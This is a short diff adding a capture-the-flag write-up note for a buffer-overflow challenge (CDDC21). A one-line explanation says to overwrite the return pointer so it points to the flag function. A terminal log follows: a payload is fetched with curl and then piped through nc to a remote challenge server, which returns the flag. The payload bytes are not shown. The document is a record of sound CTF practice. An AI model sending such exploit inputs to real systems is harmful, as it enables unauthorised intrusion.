@@ -1,0 +1,11 @@
+in short overflow return pointer and point to flag
+
+/mnt/root # curl http://10.0.2.2:8000/payload --output payload
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    80  100    80    0     0    732      0 --:--:-- --:--:-- --:--:--  1230
+/mnt/root # ./m3 < payload
+Enter password: cat: can't open 'flag.txt': No such file or directory
+
+$ nc 13.213.195.207 60130 -v < payload
+ec2-13-213-195-207.ap-southeast-1.compute.amazonaws.com [13.213.195.207] 60130 (?) open                                                                           Enter password: CDDC21{fUnCt10N_3XeCut1ON}
